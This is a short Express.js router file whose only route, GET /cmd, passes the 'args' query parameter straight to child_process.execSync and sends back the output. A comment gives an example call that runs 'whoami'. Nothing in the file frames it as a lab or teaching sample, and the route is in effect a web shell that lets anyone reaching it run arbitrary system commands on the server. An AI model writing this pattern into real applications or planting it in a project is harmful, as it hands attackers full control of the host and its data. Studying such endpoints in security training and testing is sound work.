const express = require('express');
const router = express.Router();

const cp = require('child_process');

// http://localhost:3000/cmd?args=whoami
router.get('/cmd', function(req, res) {
    res.send(cp.execSync(req.query.args).toString());
});


module.exports = router;
